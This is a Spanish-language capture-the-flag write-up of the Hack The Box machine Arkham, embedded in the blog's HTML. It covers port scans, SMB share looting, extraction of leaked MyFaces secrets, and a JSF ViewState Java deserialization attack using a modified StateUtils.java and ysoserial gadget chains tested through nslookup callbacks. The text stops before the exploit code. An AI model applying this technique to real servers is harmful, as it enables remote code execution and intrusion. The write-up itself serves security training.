@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box - Arkham :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Nombre Fortune     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.130   Maker MinatoTW      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.7, 8.5, 5.9, 4.1, 1.5] }, { label: &#34;"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/arkham/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Hack The Box - Arkham :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Nombre Fortune     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.130   Maker MinatoTW      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.7, 8.5, 5.9, 4.1, 1.5] }, { label: &#34;" />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/arkham/cover.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box - Arkham :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Nombre Fortune     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.130   Maker MinatoTW      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.7, 8.5, 5.9, 4.1, 1.5] }, { label: &#34;" />
+<meta property="og:url" content="https://sckull.github.io/posts/arkham/" />
+<meta property="og:site_name" content="Hack The Box - Arkham" />
+<meta property="og:image" content="https://sckull.github.io/../../image/htb/arkham/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "https://sckull.github.io"
+        },
+        "articleSection" : "posts",
+        "name" : "Hack The Box - Arkham",
+        "headline" : "Hack The Box - Arkham",
+        "description" : "Nombre Fortune     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.130   Maker MinatoTW      new Chart(document.getElementById("radar-chart"), { type: 'radar', data: { labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"], datasets: [ { label: "User", fill: true, backgroundColor: "rgba(179,181,198,0.2)", borderColor: "rgba(179,181,198,1)", pointBorderColor: "#fff", pointBackgroundColor: "rgba(179,181,198,1)", data: [7.7, 8.5, 5.9, 4.1, 1.5] }, { label: "",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2019",
+        "datePublished": "2019-08-10 00:00:00 &#43;0000 UTC",
+        "dateModified" : "2019-08-10 00:00:00 &#43;0000 UTC",
+        "url" : "https://sckull.github.io/posts/arkham/",
+        "wordCount" : "2263",
+        "keywords" : [ "hackthebox","masscan","nmap","java","serialization","deserialization","readpst","mutt","mutt-use","samba","netcat","nslookup","Blog" ]
+    }
+    </script>
+
+
+<meta property="article:published_time" content="2019-08-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/arkham/">Hack The Box - Arkham</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Saturday, Aug 10, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">Tags:
+        
+         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/masscan/">masscan</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/java/">java</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/serialization/">serialization</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/deserialization/">deserialization</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/readpst/">readpst</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/mutt/">mutt</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/mutt-use/">mutt-use</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/samba/">samba</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/netcat/">netcat</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/nslookup/">nslookup</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/arkham/../../image/htb/arkham/cover.png" class="post-cover" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Nombre</th>
+<th>Fortune</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>OS</td>
+<td>Windows</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>30</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Media</td>
+</tr>
+
+<tr>
+<td>IP</td>
+<td>10.10.10.130</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/8308">MinatoTW</a></td>
+</tr>
+</tbody>
+</table>
+
+<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
+    <script>
+    new Chart(document.getElementById("radar-chart"), {
+    type: 'radar',
+    data: {
+      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
+      datasets: [
+        {
+          label: "User",
+          fill: true,
+          backgroundColor: "rgba(179,181,198,0.2)",
+          borderColor: "rgba(179,181,198,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(179,181,198,1)",
+          data: [7.7, 8.5, 5.9, 4.1, 1.5]
+        }, {
+          label: "Maker",
+          fill: true,
+          backgroundColor: "rgba(255,99,132,0.2)",
+          borderColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          data: [6, 10, 5, 5, 0]
+        }
+      ]
+    },
+    options: {
+      title: {
+        display: true,
+        text: 'Calificacion'
+      }
+    }
+});
+    </script>
+</div>
+
+<hr />
+
+<hr />
+
+<h2 id="masscan">MASSCAN</h2>
+
+<p>Escaneo de puertos tcp/udp.</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/arkham# masscan -p1-65535,U:1-65535 10.10.10.130 --rate=1000 -e tun0
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-25 19:10:12 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 49666/tcp on 10.10.10.130                                 
+Discovered open port 139/tcp on 10.10.10.130                                   
+Discovered open port 445/tcp on 10.10.10.130                                   
+Discovered open port 135/tcp on 10.10.10.130                                   
+Discovered open port 8080/tcp on 10.10.10.130                                  
+Discovered open port 49667/tcp on 10.10.10.130
+</code></pre>
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Escaneo de servicios en puertos anteriormente encontrados.</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/arkham# nmap -sV -p 135,139,445,8080,49666,49667 10.10.10.130
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 19:13 GMT
+Nmap scan report for 10.10.10.130
+Host is up (0.36s latency).
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+8080/tcp  open  http          Apache Tomcat 8.5.37
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.49 seconds
+</code></pre>
+
+<h2 id="smb">SMB</h2>
+
+<p>Buscamos los sharenames a los que tengamos acceso.</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/arkham# smbclient -L 10.10.10.130
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	BatShare        Disk      Master Wayne's secrets
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.10.130 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+</code></pre>
+
+<h3 id="smb-batshare">SMB - BatShare</h3>
+
+<p>Nos conectamos al sharename.</p>
+
+<pre><code class="language-bash">root@sckull:~/htb/arkham# smbclient \\\\10.10.10.130\\BatShare
+Enter WORKGROUP\root's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; 
+smb: \&gt; ls
+  .                                   D        0  Sun Feb  3 13:00:10 2019
+  ..                                  D        0  Sun Feb  3 13:00:10 2019
+  appserver.zip                       A  4046695  Fri Feb  1 06:13:37 2019
+
+		5158399 blocks of size 4096. 2123866 blocks available
+smb: \&gt; mget *
+Get file appserver.zip? y
+getting file \appserver.zip of size 4046695 as appserver.zip (265.1 KiloBytes/sec) (average 265.1 KiloBytes/sec)
+smb: \&gt; 
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-03-25 17-46-50.png" alt="image" /></p>
+
+<pre><code class="language-bash">root@sckull:~/htb/arkham# unzip appserver.zip 
+Archive:  appserver.zip
+  inflating: IMPORTANT.txt           
+  inflating: backup.img              
+root@sckull:~/htb/arkham# ls
+appserver.zip  backup.img  IMPORTANT.txt  tmp
+</code></pre>
+
+<p>Encontramos un archivo llamado <code>appserver.zip</code> al descomprimir dicho archivo nos muestra dos archivos <code>backup.img</code> e <code>IMPORTANT.txt</code>.</p>
+
+<p><strong>IMPORTANT.txt</strong></p>
+
+<pre><code class="language-text">Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
+</code></pre>
+
+<p><strong>file backup.img</strong></p>
+
+<pre><code class="language-bash">backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 16.20.54.png" alt="image" /></p>
+
+<p><strong>BINWALK - backup.img</strong></p>
+
+<p>Utilizamos binwalk para ver el contenido del archivo <code>backup.img.</code></p>
+
+<pre><code class="language-bash">DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             LUKS_MAGIC version 0x1 aes sha256
+519168        0x7EC00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+544768        0x85000         Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+551936        0x86C00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+8388608       0x800000        Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+8542755       0x825A23        Zip archive data, at least v1.0 to extract, name: Mask/tomcat-stuff/
+8542831       0x825A6F        Zip archive data, at least v2.0 to extract, compressed size: 1006, uncompressed size: 2208, name: Mask/tomcat-stuff/tomcat-users.xml
+8543929       0x825EB9        Zip archive data, at least v2.0 to extract, compressed size: 1151, uncompressed size: 3498, name: Mask/tomcat-stuff/web.xml.bak
+8545167       0x82638F        Zip archive data, at least v2.0 to extract, compressed size: 709, uncompressed size: 1368, name: Mask/tomcat-stuff/context.xml
+8545963       0x8266AB        Zip archive data, at least v2.0 to extract, compressed size: 621, uncompressed size: 1172, name: Mask/tomcat-stuff/jaspic-providers.xml
+8546680       0x826978        Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 832, name: Mask/tomcat-stuff/faces-config.xml
+8547139       0x826B43        Zip archive data, at least v2.0 to extract, compressed size: 2599, uncompressed size: 7678, name: Mask/tomcat-stuff/server.xml
+8549824       0x8275C0        Zip archive data, at least v2.0 to extract, compressed size: 18347, uncompressed size: 174021, name: Mask/tomcat-stuff/web.xml
+8568254       0x82BDBE        Zip archive data, at least v1.0 to extract, compressed size: 39, uncompressed size: 39, name: Mask/tomcat-stuff/MANIFEST.MF
+8568380       0x82BE3C        Zip archive data, at least v2.0 to extract, compressed size: 7353, uncompressed size: 7586, name: Mask/robin.jpeg
+8575806       0x82DB3E        Zip archive data, at least v2.0 to extract, compressed size: 105045, uncompressed size: 105374, name: Mask/me.jpg
+8680920       0x8475D8        Zip archive data, at least v2.0 to extract, compressed size: 687109, uncompressed size: 687160, name: Mask/mycar.jpg
+9466405       0x907225        End of Zip archive, footer length: 22
+[ .. ]
+9638621       0x9312DD        Copyright string: &quot;copyright/ordfeminine/guillemotleft/logicalnot/hyphen/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu/para&quot;
+9962496       0x980400        PDF document, version: &quot;1.4&quot;
+[ ... ]
+9978880       0x984400        XML document, version: &quot;1.0&quot;
+9979118       0x9844EE        Copyright string: &quot;copyright ownership.&quot;
+9981952       0x985000        XML document, version: &quot;1.0&quot;
+9986048       0x986000        XML document, version: &quot;1.0&quot;
+9986286       0x9860EE        Copyright string: &quot;copyright ownership.&quot;
+9988096       0x986800        XML document, version: &quot;1.0&quot;
+9988334       0x9868EE        Copyright string: &quot;copyright ownership.&quot;
+9990144       0x987000        XML document, version: &quot;1.0&quot;
+9991168       0x987400        XML document, version: &quot;1.0&quot;
+9991406       0x9874EE        Copyright string: &quot;copyright ownership.&quot;
+9999360       0x989400        XML document, version: &quot;1.0&quot;
+9999598       0x9894EE        Copyright string: &quot;copyright ownership.&quot;
+10016768      0x98D800        JPEG image data, JFIF standard 1.01
+10024960      0x98F800        JPEG image data, JFIF standard 1.01
+10041344      0x993800        JPEG image data, EXIF standard
+10041356      0x99380C        TIFF image data, little-endian offset of first image directory: 8
+10057728      0x997800        JPEG image data, JFIF standard 1.01
+</code></pre>
+
+<p>Dentro del archivo encontramos varios documentos que se refieren a archivos tomcat, imagenes, y archivos xml, descomprimimos los archivos con binwalk.</p>
+
+<pre><code class="language-bash">binwalk -e backup.img
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 16.29.02.png" alt="image" /></p>
+
+<p>Encontramos varios archivos y carpetas, dentro de la carpeta Mask encontramos imagenes y una subcarpeta <code>tomcat-stuff</code>, utilizamos binwalk con las imagenes para verificar que no tengan archivos ocultos dentro.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 16.30.51.png" alt="image" /></p>
+
+<p>Ninguna de las imagenes contiene archivos que puedan servirnos, dentro de la carpeta <code>tomcat-stuff</code> encontramos archivos de configuracion.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 16.35.14.png" alt="image" /></p>
+
+<p>Dentro de los archivos de configuracion encontramos un backup de uno de ellos <code>web.xml.bak</code>, en su interior vemos la configuracion que tiene la pagina, algunos parametros de la configuracion contienen datos que sirven para encriptar los datos que se reciben y se envian por medio de la pagina web y podemos notar que esta corriendo en apache myfaces.</p>
+
+<pre><code class="language-xml">&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;
+&lt;url-pattern&gt;*.faces&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+&lt;context-param&gt;
+&lt;description&gt;State saving method: 'client' or 'server' (=default). See JSF Specification 2.5.2&lt;/description&gt;
+&lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;
+&lt;param-value&gt;server&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+    &lt;context-param&gt;
+        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+     &lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.MAC_SECRE&lt;T/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+</code></pre>
+
+<h2 id="http-8080">HTTP - 8080</h2>
+
+<p>Puerto 8080 en http.
+<img src="../../image/htb/arkham/Screenshot from 2019-03-25 17-47-40.png" alt="image" /></p>
+
+<h2 id="gobuster">GOBUSTER</h2>
+
+<p>Considerando que la pagina esta corrriendo en un apache myfaces (<code>web.xml.bak</code>), vamos a utilizar gobuster para buscar directorios y documentos.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 16.58.27.png" alt="image" /></p>
+
+<p>Encontramos directorios y documentos pertenecientes a la pagina, al visitar cada una de las opciones de la pagina nos encontramos una para una subscripcion de correo electronico <code>/userSubscribe.faces</code> la cual no aparecio con gobuster.</p>
+
+<h3 id="usersubscribe-faces">/userSubscribe.faces</h3>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 17.02.24.png" alt="image" /></p>
+
+<p>Al registrar un correo nos redirige a otra pagina <code>/thankyou.faces</code> con un mensaje de registro.
+<img src="../../image/htb/arkham/Screenshot from 2019-04-15 17.03.15.png" alt="image" /></p>
+
+<h3 id="viewstate-arkham">ViewState - Arkham</h3>
+
+<p>Al revisar el codigo fuente de <code>userSubscribe.faces</code> encontramos algunos valores pertenecen a <code>javax.faces.ViewState</code>.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 17.07.10.png" alt="image" /></p>
+
+<h2 id="viewstate">ViewState</h2>
+
+<p>JSF utiliza viewStates para almacenar los datos de la vista, pueden ser &lsquo;almacenados&rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de <code>javax.faces.ViewState</code>, como es el caso de la pagina que encontramos.</p>
+
+<h3 id="java-deserialization">Java Deserialization</h3>
+
+<p>Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.</p>
+
+<p>Al intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encoriptado.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-15 17.16.28.png" alt="image" /></p>
+
+<h2 id="jsf-viewstate-rce">JSF ViewState RCE</h2>
+
+<p><strong>INFO:</strong> <a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html"><strong>JSF ViewStates RCE - Vulnerability</strong></a></p>
+
+<p>Encontramos un post el cual habla de una vulnerabilidad RCE de ViewState en las implementaciones de JSF como Oracle Mojarra (<code>JSF reference implementation</code>), <code>Apache MyFaces</code>. Existen dos &lsquo;tipos&rsquo; de ViewState, el que se almacena en el servidor y el cliente, ambos son objetos serializados, para que dicha vulnerabilidad sea aprovechada para la ejecucion de comandos deben de cumplirse algunas condiciones, el viewstate no debe de estar encriptado, en el caso de Mojarra el viewstate debe de estar configurado en el cliente, en MyFaces puede estar configurado en el cliente o servidor.</p>
+
+<p>En el caso de MyFaces encriptar el <code>ViewState</code> esta por defecto activado, puede ser desactivado para hacer tests configurando el parametro de <code>org.apache.myfaces.USE_ENCRYPTION = false</code> y tambien puede utilizar una contraseña para la encriptacion. Tambien nos dice que por defecto Myfaces utiliza <code>DES</code> como algoritmo de encriptacion y <code>HMAC-SHA1</code> para autenticar el ViewState. Por defecto el almacenamiento del ViewState esta configurado por el lado del servidor <code>javax.faces.STATE_SAVING_METHOD = server</code>.</p>
+
+<p><strong>INFO:</strong> <a href="https://wiki.apache.org/myfaces/Secure_Your_Application"><strong>Secure Your Application</strong></a></p>
+
+<p>Algunos post sobre JAVA Deseralization:</p>
+
+<p><a href="https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/"><strong>Java Serialization</strong></a></p>
+
+<p><a href="https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/"><strong>Java Serialization with burp and ysoserial</strong></a></p>
+
+<p><a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a"><strong>Deserialization Vulnerability - $1500</strong></a></p>
+
+<p>Ahora que sabemos todo esto, podemos volver a nuestro archivo <code>web.xml.bak</code> el cual contiene algunos parametros que pueden ser de utilidad para aprovechar el RCE del ViewState y ejecutar comandos dentro de la maquina.</p>
+
+<pre><code class="language-xml">&lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;
+&lt;param-value&gt;server&lt;/param-value&gt;
+</code></pre>
+
+<p>Tambien tiene una contraseña que es utilizada para encriptar el viewstate.</p>
+
+<pre><code class="language-xml">&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+</code></pre>
+
+<p>El algoritmo de autenticacion.</p>
+
+<pre><code class="language-xml">&lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+&lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+</code></pre>
+
+<p>Mensaje de autenticacion para el algoritmo.</p>
+
+<pre><code class="language-xml">&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+</code></pre>
+
+<h2 id="stateutils-java">StateUtils.java</h2>
+
+<p>Existen algunas herramientas para explotacion de deserializacion en java como <a href="https://github.com/joaomatosf/jexboss"><strong>jexboss</strong></a> y <a href="https://github.com/frohoff/ysoserial"><strong>ysoserial</strong></a>, tambien existe una version modificada de <a href="https://github.com/pimps/ysoserial-modified"><strong>ysoserial-modified</strong></a>. Al intentar utilizar estas herramientas contra la maquina no funcionan, por el tipo de encriptacion en la configuracion del archivo (<code>web.xml.bak</code>), estas herramientas aprovechan el viewstatate cuando no estan encriptadas.</p>
+
+<p>Para arkham vamos a utilizar ysoserial-modified para generar un payload y encriptarlo por medio de la clase de <a href="https://github.com/apache/myfaces"><strong>apache myfaces</strong></a>, StateUtils.java, esta clase <a href="https://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html"><strong>StateUtils.java</strong></a> contiene metodos que pueden construir y reconstruir un valor de viewstate.</p>
+
+<p>Configuracion de los campos:</p>
+
+<pre><code class="language-java">private static final Logger log = Logger.getLogger(StateUtils.class.getName());
+//Cambio por HmacSHA1
+public static final String macAlgorithm = &quot;HmacSHA1&quot;;
+//Cambio por MAC_SECRET -&gt; SnNGOTg3Ni0=
+//public static final String INIT_MAC_SECRET = &quot;MAC_SECRET&quot;;
+//public static final String INIT_MAC_SECRET_KEY_CACHE = &quot;org.apache.myfaces.MAC_SECRET.CACHE&quot;;
+//configuracion Local encrypt/decrypt
+private static final String encodedKey =&quot;SnNGOTg3Ni0=&quot;;        
+private static final byte[] decodedKey = decode(encodedKey.getBytes());
+private static final SecretKey secretKey = new SecretKeySpec(decodedKey,&quot;DES&quot;);    
+//configuracion Local encrypt/decrypt
+private static final String macSecretStr = &quot;SnNGOTg3Ni0=&quot;;
+private static final byte[] macSecretBytes = decode(macSecretStr.getBytes());
+private static final SecretKey macSecretKey = new SecretKeySpec(macSecretBytes, macAlgorithm);    
+private static final String ZIP_CHARSET = &quot;ISO-8859-1&quot;;
+// String DEFAULT_ALGORITHM = &quot;DES&quot;;
+private static final String algorithm = &quot;DES&quot;;
+// String DEFAULT_ALGORITHM_PARAMS = &quot;ECB/PKCS5Padding&quot;;
+private static final String algorithmParams = &quot;ECB/PKCS5Padding&quot;;
+private static final byte[] iv = null;
+</code></pre>
+
+<p>Metodos, se eliminan todos los valores ExternalContext, ServletContext:</p>
+
+<pre><code class="language-java">construct(Object object) 
+reconstruct(String string)
+encrypt(byte[] insecure)
+encode(byte[] bytes)
+decrypt(byte[] secure)    
+decode(byte[] bytes)
+getAsObject(byte[] bytes)
+getAsByteArray(Object object)
+</code></pre>
+
+<p>Creamos un metodo para enviar nuestro payload:</p>
+
+<pre><code class="language-java">sendPayload(String viewstatePayload)
+</code></pre>
+
+<p>Para la ejecucion de comandos utilizamos ysoserial-modified.jar para generar un payload:</p>
+
+<pre><code class="language-bash">CommonsCollections1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6
+</code></pre>
+
+<p><em>Funciona tambien con la version ysoserial.jar, pero se tienen comandos &lsquo;limitados&rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.</em></p>
+
+<p>Ya que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: <code>nslookup CommonsCollections1 10.10.1X.1X</code>) y el payload que funcione nos aparecerá en nuestra terminal (Utilizamos <a href="https://github.com/SpiderLabs/Responder"><strong>responder</strong></a>).</p>
+
+<p>Aqui se encuentra el codigo:</p>
+
